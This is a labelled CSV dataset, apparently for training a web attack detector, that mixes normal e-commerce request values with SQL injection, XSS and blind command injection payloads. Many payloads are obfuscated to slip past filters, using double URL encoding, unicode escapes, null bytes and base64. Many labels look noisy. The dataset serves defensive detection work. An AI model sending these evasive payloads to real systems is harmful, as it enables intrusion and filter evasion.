payload,label,source
96EF58AF2079E421788C8172D91A2771,Normal,csic_gsi:cisc_normalTraffic_train.txt
g%00ussy,SQLi,obfuscation:null_byte
"eval(atob('PERJViBTVFlMRT0iYmFja2dyb3VuZC1pbWFnZTogdXJsKCYjMTtqYQ=='))vascript:alert('XSS'))"">",XSS,obfuscation:base64_fragment
4C7A9988F7A87F9FBCF8DF3A59186719/*--*/,SQLi,obfuscation:nested_comment
3CB7E77D1CB6A87DFC28D2856A92C55F,Normal,csic_gsi:cisc_normalTraffic_train.txt
%25257C%252520%25255B%2525203%252520-ne%252520%252524%252528echo%252520KBHDAS%252520%25257C%252520tr%252520-d%252520%252527%25255Cn%252527%252520%25257C%252520wc%252520-c%252529%252520%25255D%252520%25257C%25257C%252520sleep%2525201%252520%25252522,CMD,obfuscation:double_url_encode
8\u0045E4607738217A\u0041\u0041\u00439\u0044B4B487\u0046D6095\u0044,SQLi,obfuscation:unicode_escape
logn\u0074\u0070,SQLi,obfuscation:unicode_escape
"{""a"":{""b"":""2E330AC4C8762AA3399826FB876C500B""}}",SQLi,obfuscation:json_nested_escape
D3A8012E125B63AFD08D0F3768%00B6F37C,SQLi,obfuscation:null_byte
eval(atob('bW9kbz1lbnRyYXImbG9naW49cHVnbGlhJnB3ZD1hYnVuRGFuVEVNZQ=='))Nte&rememberA=on&B1=Entrar,SQLi,obfuscation:base64_fragment
CC1EF77D45473AAB01DEE9A4400F4899,Normal,csic_gsi:cisc_normalTraffic_train.txt
"--WebKitFormBoundary81432
Content-Disposition: form-data; name=""q""

57728968A
--WebKitFormBoundary81432--",SQLi,obfuscation:multipart_boundary_sim
"""%7Cecho%20GPGSXE%00$((20%2B85))$(echo%20GPGSXE)GPGSXE//",CMD,obfuscation:null_byte
ｉd=2|,SQLi,obfuscation:unicode_normalization
"{""a"":{""b"":""DEBDE2610E252ED46BC460711A93D35D""}}",SQLi,obfuscation:json_nested_escape
"--WebKitFormBoundary17578
Content-Disposition: form-data; name=""q""

%3B%20str%3D%24%28echo%20EPCBGX%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20
--WebKitFormBoundary17578--",CMD,obfuscation:multipart_boundary_sim
Calle+Dulzaina+119+1C' OR '1'='1,SQLi,obfuscation:logic_or_tautology
"--WebKitFormBoundary52202
Content-Disposition: form-data; name=""q""

Adolfina
--WebKitFormBoundary52202--",SQLi,obfuscation:multipart_boundary_sim
"{""a"":{""b"":""2BDE58DB642E98CED16402A93A64C91E""}}",SQLi,obfuscation:json_nested_escape
"{""a"":{""b"":""modo=insertar&precio=2426&B1=Pasar+por+caja/""}}",SQLi,obfuscation:json_nested_escape
%27%0a%20stR%3d%24%28ecHo%20jQnexE%29%0A%20StR1%3D%24%7b%23Str%7D%0A%20if%20%5B%207%20-nE%20%24%7Bstr1%7d%20%5d%0A%20THEN%20sleeP%200%0A%20elSe%20sLEep%201%0A%20fI%20,CMD,obfuscation:case_random
id=1&nombre=%00Jam�n+Ib�rico&precio=85+&cantidad=80&B1=A�adir+al+carrito,SQLi,obfuscation:null_byte
"Molinos,+Los",Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%2520echo%2520TZKEKG%24%28%2848%252B96%29%29%24%28echo%2520TZKEKG%29TZKEKG%257C,CMD,obfuscation:url_encode
C35\u0046378\u00461\u00440\u0046494\u00437078D8\u0043926256581,SQLi,obfuscation:unicode_escape
24549666H,Normal,csic_gsi:cisc_normalTraffic_test.txt
"--WebKitFormBoundary51635
Content-Disposition: form-data; name=""q""

2F1BA6042D979BDCB2224E84202BCF2D
--WebKitFormBoundary51635--",SQLi,obfuscation:multipart_boundary_sim
%26ｅcho%20LQDBIP$((97%2B15))$(ｅchｏ%20LQDBIP)LQDBIP,CMD,obfuscation:unicode_normalization
%7\u0043%20%5\u0042%201%20-ne%20%24%28ec\u0068\u006f%20R\u0055NAL\u0043%20%7C%20\u0074\u0072%20-d%20%27%5Cn%27%20%7C%20w\u0063%20-c%29%20%5D%20%7C%7C%20s\u006c\u0065ep%201%20%5C%5C,CMD,obfuscation:unicode_escape
566809A4868D295AC323DDBD689545F9' OR '1'='1,SQLi,obfuscation:logic_or_tautology
i\u0064=2/&n\u006f\u006d\u0062re=Q\u0075e\u0073o+Ma\u006ec\u0068e\u0067\u006f&p\u0072ec\u0069o=100&ca\u006e\u0074i\u0064\u0061d=48&\u00421=A�adi\u0072+\u0061\u006c+\u0063a\u0072ri\u0074o,SQLi,obfuscation:unicode_escape
79149D9DDBE8861F092BB78AA636C001,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=chaplin&password=salido&nombre=Pascuala&apellidos=Luque&email=pullman-mcclintock@surcosur.st&dni=50779094Q&direccion=Calle+Tortajada+S/N,+6?A&ciudad=Jabalquinto&cp=16118&provincia=Burgos&ntc=0932689894259111&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
%7\u0043%20%5B%203%20-\u006e\u0065%20%24%28\u0065\u0063h\u006f%20\u0051\u004a\u0044BJN%20%7\u0043%20\u0074\u0072%20-\u0064%20%27%5\u0043n%27%20%7C%20wc%20-c%29%20%5\u0044%20%7C%7\u0043%20slee\u0070%201%20%27,CMD,obfuscation:unicode_escape
Colobran+Rebull,Normal,csic_gsi:cisc_normalTraffic_train.txt
65F7CE6CDCB421B32D172E563B549BF0,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=1&id=8E1821F48BA3BB4B320997254005EC91,SQLi,obfuscation:hpp_duplicate_param
078F1CE095F924DABF61C03193AA8CA0' OR '1'='1,SQLi,obfuscation:logic_or_tautology
Ronda%252BCervantes%252B146%252C%252B13%253FG,SQLi,obfuscation:double_url_encode
1%20/*--*/,SQLi,obfuscation:nested_comment
berthels-dahlbeck@muevemiweb.br,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
&eCho$iFspnMRRI$((20%2b12))$(ECHO$IFspNMrRi)PnMrrI%26,CMD,obfuscation:case_random
1A752AAC6\u004100A6\u004386C\u004640D355BB6E5\u00447,SQLi,obfuscation:unicode_escape
D4B9182D8C9D34FC05DED88CCF04DFB5,Normal,csic_gsi:cisc_normalTraffic_train.txt
"{""a"":{""b"":""modoA=entrar&login=ibntas&pwd=atumecimiento&remember=off&B1=Entrar""}}",SQLi,obfuscation:json_nested_escape
%26%20SlEeP%200%20%26%26%20stR%3d%24%28echo%20pdoPTj%29%20%26%26%20STr1%3d%24%7B%23STR%7D%20%26%26%20%5b%203%20-Eq%20%24%7BStr1%7D%20%5D%20%26%26%20SlEep%201%20//,CMD,obfuscation:case_random
"CONCAT(CHAR(111),CHAR(110),CHAR(121),CHAR(115),CHAR(104),CHAR(107),CHAR(111))",SQLi,obfuscation:char_function
%3Becho$%00IFSKUUKMT$((50%2B2))$(echo$IFSKUUKMT)KUUKMT%5C%5C,CMD,obfuscation:null_byte
00D5F3C33ED30C06D70554E2AB8C4F5C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"{""a"":{""b"":""09BF818C8B6E9EFE9DF5F28745D5948B""}}",SQLi,obfuscation:json_nested_escape
errorMsg%3D%27%2BAND%2B%271%27%3D%271,SQLi,obfuscation:url_encode
396961A8A6D81A715180B8C5AE6DA2F5,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=1&id=echo$IFSCTYHYD$((2%2B94))$(echo$IFSCTYHYD)CTYHYD%7C,SQLi,obfuscation:hpp_duplicate_param
id%EF%BF%BDl5co,SQLi,obfuscation:url_encode
E6C199B27F112B02C6C81F83ACDB08CA,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2529print%2528%2560echo%252520NNYPSL%2560.%2560echo%252520%2524%2528%252856%25252B33%2529%2529%2560.%2560echo%252520NNYPSL%2560.%2560echo%252520NNYPSL%2560%2529%25253B.%252527NNYPSL,CMD,obfuscation:double_url_encode
DA9C1F0CCB1DF4227982CB3E237D9571,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
""".print(`echo%20UFRBLO%0aecho%20$((1%2B17))%0a%00echo%20UFRBLO%0aecho%20UFRBLO`)%3B%252529%25257DUFRBLO",CMD,obfuscation:null_byte
C9F0EFE0C4501EB875ED2302632D3491,Normal,csic_gsi:cisc_normalTraffic_train.txt
62F8AAD931B177E3C981CF087D7FFC18,Normal,csic_gsi:cisc_normalTraffic_train.txt
%252526%252520sleep%2525200%252520%252526%252526%252520str%25253D%252524%252528echo%252520HMZJIQ%252529%252520%252526%252526%252520str1%25253D%252524%25257B%252523str%25257D%252520%252526%252526%252520%25255B%2525201%252520-eq%252520%252524%25257Bstr1%25257D%252520%25255D%252520%252526%252526%252520sleep%2525201%252520%25257C,CMD,obfuscation:double_url_encode
"--WebKitFormBoundary79177
Content-Disposition: form-data; name=""q""

%2527%3B%20str%3D%24%28echo%20AUJGTN%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C
--WebKitFormBoundary79177--",CMD,obfuscation:multipart_boundary_sim
2bｏb@<SCRｉpt>alerｔ(Paros)</ｓcrIPT>.paroｓprｏxy.ｏrg,XSS,obfuscation:unicode_normalization
%29print%28%60echo%2520QADPCR%3Becho%2520%24%28%2851%252B16%29%29%3Becho%2520QADPCR%3Becho%2520QADPCR%60%29%253B%252529%25257DQADPCR,CMD,obfuscation:url_encode
ma*guillo' OR '1'='1,SQLi,obfuscation:logic_or_tautology
"""%7C%7Cecho%20PHPVAS$((47%2B19))$(echo%20PHPVAS)PHPVAS%5C%5C",CMD,seclists_cmd
"'%26%26echo%20YBQKFD$((48%2B31))$(echo%20YBQKFD)YBQKFD""",CMD,seclists_cmd
347D3AB58B5B7202F1A248B18A07C1A2/*--*/,SQLi,obfuscation:nested_comment
carolyne/*--*/,SQLi,obfuscation:nested_comment
%25252527%252526%252520sleep%2525200%252520%252526%252526%252520str%25253D%252524%252528echo%252520KMQXRC%252529%252520%252526%252526%252520str1%25253D%252524%25257B%252523str%25257D%252520%252526%252526%252520%25255B%2525205%252520-eq%252520%252524%25257Bstr1%25257D%252520%25255D%252520%252526%252526%252520sleep%2525201%252520%25252527,CMD,obfuscation:double_url_encode
);}print(`echo%20BCMROJ;echo%20$((2%2B69));echo%20BCMROJ;echo%20BCMROJ`)%3B.%2527BCMROJ,CMD,seclists_cmd
id=1&id=715417c94oR$i3,SQLi,obfuscation:hpp_duplicate_param
%2522%25257C%25257Cecho%2524IFSWGMPYH%2524%2528%252866%25252B86%2529%2529%2524%2528echo%2524IFSWGMPYH%2529WGMPYH%252527,CMD,obfuscation:double_url_encode
"c/?a,ry' OR '1'='1",SQLi,obfuscation:logic_or_tautology
alland.soeltoft%40aridossanchez.do,SQLi,obfuscation:url_encode
"%7C%7Ce\u0063ho%20\u004a\u004e\u0049\u0041\u0052V$((94%2B19))$(ec\u0068o%20\u004aNIAR\u0056)JN\u0049\u0041\u0052\u0056""",CMD,obfuscation:unicode_escape
5083698855321760,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4825,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
dD9EA9e04CE517D6FE5EA0e081C57942,SQLi,obfuscation:case_random
id=3&nombre=Jam�n'+Ib�ric-'o&precio=100&cantidad=30&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1552564007403755/*--*/,SQLi,obfuscation:nested_comment
E1507683B902B53A3D1A6D8240A44032,Normal,csic_gsi:cisc_normalTraffic_train.txt
FE76\u00438\u0045D\u0046201F2854AC613612302300\u0041,SQLi,obfuscation:unicode_escape
"Calle+Miguel+Lopez+De+Legazpi,+48,+8F",Normal,csic_gsi:cisc_normalTraffic_train.txt
Helvio,Normal,csic_gsi:cisc_normalTraffic_train.txt
\u006d\u006f\u0064\u006f=\u0069n\u0073\u0065\u0072tar&\u0070r\u0065\u0063io=4831&B1=\u0043\u006fn\u0066ir\u006d\u0061r?,SQLi,obfuscation:unicode_escape
"--WebKitFormBoundary93617
Content-Disposition: form-data; name=""q""

9EC1F2C8E48219862A44B13EF116AB3C
--WebKitFormBoundary93617--",SQLi,obfuscation:multipart_boundary_sim
03773,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
antonin,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"--WebKitFormBoundary29359
Content-Disposition: form-data; name=""q""

%27%7C%20%5B%203%20-ne%20%24%28echo%20JTXVKL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20
--WebKitFormBoundary29359--",CMD,obfuscation:multipart_boundary_sim
LacHINe,SQLi,obfuscation:case_random
eval(atob('RTJCQ0E4QkUyRjkyRkQwNjM0RTAyRjRCQjgxMkMyQUE=')),SQLi,obfuscation:base64_fragment
modo=entrar&loginA=ginsberg&pwd=e23am!pa83r&remember=on&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0D4307593319FC5ABFA0DAD23677CF1E,Normal,csic_gsi:cisc_normalTraffic_test.txt
"--WebKitFormBoundary90035
Content-Disposition: form-data; name=""q""

%3B%20str%3D%24%28echo%20NMEESI%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522
--WebKitFormBoundary90035--",CMD,obfuscation:multipart_boundary_sim
"Cerro+de+And�valo,+El",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
g%00rueng,SQLi,obfuscation:null_byte
68%0057,SQLi,obfuscation:null_byte
02F79Cd3c3B68AC294162119296D9Ce2,SQLi,obfuscation:case_random
id=1&id=E6CCB2E43009EE80B7B71387B0A73248,SQLi,obfuscation:hpp_duplicate_param
%25250aecho%252520ANSTBN%2524%2528%252820%25252B35%2529%2529%2524%2528echo%252520ANSTBN%2529ANSTBN%25255C%25255C,CMD,obfuscation:double_url_encode
18300,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%26echo%20AIBILK$((43%2B3))$(echo%20AIBILK)AIBILK',CMD,seclists_cmd
F72AD1413864532665134D285CDCA00A,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20APHWVY%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20,CMD,seclists_cmd
De!9�n/*--*/,SQLi,obfuscation:nested_comment
Credenciales+inco'+'rrectasany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A,SQLi,obfuscation:keyword_concat_split
Nidya,Normal,csic_gsi:cisc_normalTraffic_train.txt
Kia\u0072a,SQLi,obfuscation:unicode_escape
%22%26echo%20NFZBSQ$((53%2B70))$(echo%20NFZBSQ)NFZBSQ\,CMD,seclists_cmd
<HTML><BODY>,SQLi,community:payloads_seed
7F0541BF9CC22BC1D1E185D0D6845C12,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6703EBB1EC6A8E92BCFD680724BE022F,Normal,csic_gsi:cisc_normalTraffic_test.txt
C64EFB6170CC4582CD04CF56132371CC,Normal,csic_gsi:cisc_normalTraffic_train.txt
3796EBF320E4B17A697F0AA4B35E8F32,Normal,csic_gsi:cisc_normalTraffic_test.txt
D1F26A3B2E34518D78E20F775A59020D,Normal,csic_gsi:cisc_normalTraffic_test.txt
6F5377C52D56C47625726C0A987BCA84/*--*/,SQLi,obfuscation:nested_comment
470519ED76A66E12366E1B5EC5A4D0C8,Normal,csic_gsi:cisc_normalTraffic_test.txt
eval(atob('JyZlY2hvJElGU1FLWllQUCQoKDU1JTJCMjcpKSQoZWNobyRJRlNRSw=='))ZYPP)QKZYPP%27,CMD,obfuscation:base64_fragment
%3B%20str%3D%24%28echo%20ZVPMJQ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%26,CMD,seclists_cmd
4E29E777818744DDDC81175F78B4993A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7003,Normal,csic_gsi:cisc_normalTraffic_train.txt
58556B677E3ABC3EF01AD0CC9B34CADF,Normal,csic_gsi:cisc_normalTraffic_test.txt
eval(atob('NDEwNDczMzQ1OTM1NDAz')),SQLi,obfuscation:base64_fragment
""";echo%20LWIARI$((%0077%2B11))$(echo%20LWIARI)LWIARI%5C%5C",CMD,obfuscation:null_byte
eldin/*--*/,SQLi,obfuscation:nested_comment
5C8330F19D8A112F093141657843808F,Normal,csic_gsi:cisc_normalTraffic_test.txt
%252526%252520sleep%2525200%252520%252526%252526%252520str%25253D%252524%252528echo%252520GHGVOR%252529%252520%252526%252526%252520str1%25253D%252524%25257B%252523str%25257D%252520%252526%252526%252520%25255B%2525201%252520-eq%252520%252524%25257Bstr1%25257D%252520%25255D%252520%252526%252526%252520sleep%2525201%252520%252523,CMD,obfuscation:double_url_encode
B2=Vaciar+carrito?,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2522%0A%20ｓｔr%3D%24%28echｏ%20HFKZYC%29%0A%20ｓtr1%3D%24%7B%23ｓtr%7D%0A%20ｉf%20%5B%202%20-ｎe%20%24%7Bｓtr1%7D%20%5D%0A%20thｅｎ%20ｓｌeｅp%200%0A%20ｅｌｓe%20ｓｌeep%201%0A%20fｉ%20%2522,CMD,obfuscation:unicode_normalization
"--WebKitFormBoundary43005
Content-Disposition: form-data; name=""q""

%2522%0A%20str%3D%24%28echo%20YQOMCI%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C
--WebKitFormBoundary43005--",CMD,obfuscation:multipart_boundary_sim
brookes,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&id=2662FFE6704A2860FA7721F891ACCB76,SQLi,obfuscation:hpp_duplicate_param
AAF943E23EEB1E965E11FC808587FE81,Normal,csic_gsi:cisc_normalTraffic_train.txt
Calle+Cubas+110+,Normal,csic_gsi:cisc_normalTraffic_test.txt
poluchow,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%7C%20%5B%202%20-ne%20%24%28echo%20AYUZTB%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F,CMD,seclists_cmd
%3\u0042%20str%3\u0044%24%28\u0065\u0063\u0068o%20EEK\u004aD\u0045%29%3\u0042%20s\u0074\u00721%3D%24%7B%23\u0073\u0074r%7D%3\u0042%20i\u0066%20%5\u0042%203%20-ne%20%24%7Bst\u00721%7\u0044%20%5D%3B%20t\u0068\u0065n%20sl\u0065\u0065p%200%3B%20else%20\u0073\u006ceep%201%3\u0042%20\u0066i%20%252\u0046%252F,CMD,obfuscation:unicode_escape
3E75ED767B5DF40C48C1D64C1B1BB60F,Normal,csic_gsi:cisc_normalTraffic_train.txt
E7AF3F6FD183FC37875F4632B7086690' OR '1'='1,SQLi,obfuscation:logic_or_tautology
%3b%20STR%3D%24%28ECho%20YsDkBb%29%3B%20sTR1%3D%24%7B%23str%7d%3B%20IF%20%5B%208%20-ne%20%24%7bstr1%7D%20%5D%3B%20THen%20sLeEP%200%3B%20elSe%20SLeeP%201%3B%20fi%20%27,CMD,obfuscation:case_random
C811676712F0371E49C6E00A0772EC60,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&id=Torralba+de+Arag�n,SQLi,obfuscation:hpp_duplicate_param
%3B%20str%3D%24%28echo%20OIPHJR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526,CMD,seclists_cmd
ba%00larrasa,SQLi,obfuscation:null_byte
%27%3Becho%2520EDEYQK%24%28%2845%252B89%29%29%24%28echo%2520EDEYQK%29EDEYQK%2526,CMD,obfuscation:url_encode
8E1A10541C4CAC74429320D5343FE23D,Normal,csic_gsi:cisc_normalTraffic_train.txt
40CBDAF773D7A623D595BBBB569EACBD' OR '1'='1,SQLi,obfuscation:logic_or_tautology
"--WebKitFormBoundary41274
Content-Disposition: form-data; name=""q""

wingrove
--WebKitFormBoundary41274--",SQLi,obfuscation:multipart_boundary_sim
aa766b24F4CED497460453Dd5b564b69,SQLi,obfuscation:case_random
%27%0A%20str%3D%24%28echo%20WYYYZM%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522' OR '1'='1,SQLi,obfuscation:logic_or_tautology
A%00lcubillas,SQLi,obfuscation:null_byte
%22&echo%20XDIPPG$((33%2B59))$(echo%20XDIPPG)XDIPPG%26,CMD,seclists_cmd
eval(atob('M0UwMTI2OEI0MTQ3M0Y3NTYzQkQ0QjBDOUQ1QUZDNDU=')),SQLi,obfuscation:base64_fragment
67D9D28B98462D5BECCA5593A84F675A,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2526%2526echo%252520ANJDXN%2524%2528%252818%25252B20%2529%2529%2524%2528echo%252520ANJDXN%2529ANJDXN%2527,CMD,obfuscation:double_url_encode
"--WebKitFormBoundary79843
Content-Disposition: form-data; name=""q""

%0aecho$IFSLBYCDI$((79%2B92))$(echo$IFSLBYCDI)LBYCDI\
--WebKitFormBoundary79843--",CMD,obfuscation:multipart_boundary_sim
Haroldo,Normal,csic_gsi:cisc_normalTraffic_train.txt
'&&echo$IFSUGEJWF$((34%2B81))$(echo$IFSUGEJWF)UGEJWF%27,CMD,seclists_cmd
479E53E46F55FAAAB1FE0CFE750D394F,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20SLEEP%200%20%26%26%20Str%3D%24%28ecHo%20qTrmRj%29%20%26%26%20STr1%3d%24%7b%23StR%7D%20%26%26%20%5B%204%20-Eq%20%24%7bStr1%7D%20%5d%20%26%26%20SleEP%201%20%255c%255c,CMD,obfuscation:case_random
%0A%20ｓｔr%3D%24%28ｅchｏ%20DPBAVN%29%0A%20sｔr1%3D%24%7B%23ｓtr%7D%0A%20ｉf%20%5B%204%20-ne%20%24%7Bｓtr1%7D%20%5D%0A%20ｔhｅn%20slｅep%200%0A%20eｌｓｅ%20sｌｅｅp%201%0A%20fｉ%20%27,CMD,obfuscation:unicode_normalization
F629179CD66635CA4B3845ACC097024F,Normal,csic_gsi:cisc_normalTraffic_test.txt
"{""a"":{""b"":""<STYLE type=\""text/css\"">BODY{background:url(\""javascript:alert('XSS')\"")}</STYLE>""}}",XSS,obfuscation:json_nested_escape
B%002F6DE100CFDEA99CD68F6BC6EA4912E,SQLi,obfuscation:null_byte
gaRciA,SQLi,obfuscation:case_random
7D3203C171C18E117BBDB2D161BCFB%0017,SQLi,obfuscation:null_byte
\u0043o\u006c\u006c\u0061nt\u0065\u0073+\u0043\u0061\u0072t\u0061\u0079a,SQLi,obfuscation:unicode_escape
%26echo%20VOANQN$((77%2B86))$(echo%20VOANQN)VOANQN',CMD,seclists_cmd
%25252522%252526%252520sleep%2525200%252520%252526%252526%252520str%25253D%252524%252528echo%252520XTMPBT%252529%252520%252526%252526%252520str1%25253D%252524%25257B%252523str%25257D%252520%252526%252526%252520%25255B%2525203%252520-eq%252520%252524%25257Bstr1%25257D%252520%25255D%252520%252526%252526%252520sleep%2525201%252520%25257C,CMD,obfuscation:double_url_encode
|ｅchｏ$IFSZIARXP$((32%2B15))$(ｅcho$IFSZIARXP)ZIARXP%5C%5C,CMD,obfuscation:unicode_normalization
%3B%20\u0073tr%3D%24%28ec\u0068\u006f%20\u0047U\u0041SV\u0057%29%3\u0042%20\u0073tr1%3\u0044%24%7B%23st\u0072%7\u0044%3\u0042%20\u0069f%20%5\u0042%201%20-n\u0065%20%24%7\u0042str1%7D%20%5\u0044%3B%20th\u0065n%20sle\u0065p%200%3\u0042%20el\u0073e%20sle\u0065p%201%3B%20f\u0069%20%23,CMD,obfuscation:unicode_escape
17217664W,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=1&id=EF7F45A63778C923B3B4681182B4637B,SQLi,obfuscation:hpp_duplicate_param
44636251J' OR '1'='1,SQLi,obfuscation:logic_or_tautology
%3B%20str%3D%24%28echo%20WLZIBA%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%27,CMD,seclists_cmd
%27print%28%60echo%2520BFUQZN%250aecho%2520%24%28%2842%252B76%29%29%250aecho%2520BFUQZN%250aecho%2520BFUQZN%60%29%253B%25252529%2525257DBFUQZN,CMD,obfuscation:url_encode
%7C%20%5B%208%20-ne%20%24%28echo%20FPMDOL%20%7C%20tr%20-d%20%27%5Cn%2%007%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23,CMD,obfuscation:null_byte
%25252527%252526%252520sleep%2525200%252520%252526%252526%252520str%25253D%252524%252528echo%252520EEDNGD%252529%252520%252526%252526%252520str1%25253D%252524%25257B%252523str%25257D%252520%252526%252526%252520%25255B%2525206%252520-eq%252520%252524%25257Bstr1%25257D%252520%25255D%252520%252526%252526%252520sleep%2525201%252520%25255C%25255C,CMD,obfuscation:double_url_encode
');}print(`echo%20FOGQPM\necho%20$((27%2B12))\necho%20FOGQPM\necho%20FOGQPM`)%3B%2525255C%2525255CFOGQPM,CMD,seclists_cmd
modo=entrar&login=banerje%00e&pwd=i1ic-�neo|&remember=on&B1=Entrar,SQLi,obfuscation:null_byte
03696380G,Normal,csic_gsi:cisc_normalTraffic_test.txt
red8lear/*--*/,SQLi,obfuscation:nested_comment
%25250A%252520str%25253D%252524%252528echo%252520IRXTAA%252529%25250A%252520str1%25253D%252524%25257B%252523str%25257D%25250A%252520if%252520%25255B%2525205%252520-ne%252520%252524%25257Bstr1%25257D%252520%25255D%25250A%252520then%252520sleep%2525200%25250A%252520else%252520sleep%2525201%25250A%252520fi%252520%252F%252F,CMD,obfuscation:double_url_encode
6BAA273A26E52BE03027AC470F17%001096,SQLi,obfuscation:null_byte
"Ametlla+de+Mar,+L'",Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('NjgzOA==')),SQLi,obfuscation:base64_fragment
cristion' OR '1'='1,SQLi,obfuscation:logic_or_tautology
B4AC058D3F0B06FAE710CF64C1C67F47,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0A62C631750825EFF2E7F1CA27BE879C,Normal,csic_gsi:cisc_normalTraffic_train.txt
&echo%20IWRTXC$((50%2B84))$(echo%20IWRTXC)IWRTXC,CMD,seclists_cmd
%2522%0A%20s%00tr%3D%24%28echo%20OECGFV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20//,CMD,obfuscation:null_byte
3D045BAC10A419545C5B3D9036361E4B,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=1211&B1=Pasa%00r+por+caja/,SQLi,obfuscation:null_byte
id%3D3%26nombre%3DVino%2BRioja%26precio%3D100%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor%2Bdelay%2B%270%3A0%3A15%27%3B--%26cantidad%3D85%26B1%3DA%EF%BF%BDadir%2Bal%2Bcarrito,SQLi,obfuscation:url_encode
